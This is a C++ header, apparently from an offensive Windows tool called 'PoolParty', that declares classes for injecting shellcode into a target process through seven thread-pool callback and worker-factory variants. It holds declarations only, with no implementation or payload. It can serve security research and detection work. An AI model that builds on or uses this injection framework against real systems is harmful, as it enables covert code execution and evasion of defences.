#pragma once

#include <boost/log/core.hpp>
#include <boost/log/trivial.hpp>
#include <boost/log/expressions.hpp> 
#include <boost/format.hpp>
#include <boost/log/utility/setup/console.hpp>
#include <boost/log/utility/setup/common_attributes.hpp>

#include <codecvt>

#include <Windows.h>

#include "Misc.hpp"
#include "Native.hpp"
#include "WorkerFactory.hpp"
#include "ThreadPool.hpp"
#include "WinApi.hpp"
#include "HandleHijacker.hpp"

namespace logging = boost::log;
namespace keywords = boost::log::keywords;

#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
#define POOL_PARTY_EVENT_NAME L"PoolPartyEvent"
#define POOL_PARTY_FILE_NAME L"PoolParty_invitation.txt"
#define POOL_PARTY_JOB_NAME L"PoolPartyJob"

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

typedef struct _POOL_PARTY_CMD_ARGS
{
	BOOL bDebugPrivilege;
	int VariantId;
	int TargetPid;
} POOL_PARTY_CMD_ARGS, * PPOOL_PARTY_CMD_ARGS;

class PoolParty
{
protected:
	DWORD m_dwTargetPid;
	std::shared_ptr<HANDLE> m_p_hTargetPid;
	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
	unsigned char* m_cShellcode;
	SIZE_T m_szShellcodeSize;
	PVOID m_ShellcodeAddress;
	WORKER_FACTORY_BASIC_INFORMATION m_WorkerFactoryInformation;
public:
	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode);
	std::shared_ptr<HANDLE> GetTargetProcessHandle() const;
	std::shared_ptr<HANDLE> GetWorkerFactoryHandle() const;
	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation() const;
	virtual LPVOID AllocateShellcodeMemory() const;
	void WriteShellcode() const;
	virtual void SetupExecution() const PURE;
	void Inject();
	virtual ~PoolParty() = default;
};

class RemoteWorkItemInsertion : public PoolParty {
public: 
	RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() const override;
	~RemoteWorkItemInsertion() override = default;
};

class WorkerFactoryStartRoutineOverwrite : public PoolParty {
public:
	WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode);
	LPVOID AllocateShellcodeMemory() const override;
	void SetupExecution() const override;
	~WorkerFactoryStartRoutineOverwrite() override = default;
};

class RemoteWaitCallbackInsertion : public PoolParty {
public:
	RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() const override;
	~RemoteWaitCallbackInsertion() override = default;
};

class RemoteIoCompletionCallbackInsertion : public PoolParty {
public:
	RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() const override;
	~RemoteIoCompletionCallbackInsertion() override = default;
};

class RemoteAlpcCallbackInsertion : public PoolParty {
public:
	RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() const override;
	~RemoteAlpcCallbackInsertion() override = default;
};

class RemoteJobCallbackInsertion : public PoolParty {
public:
	RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() const override;
	~RemoteJobCallbackInsertion() override = default;
};

class RemoteDirectCallbackInsertion : public PoolParty {
public:
	RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() const override;
	~RemoteDirectCallbackInsertion() override = default;
};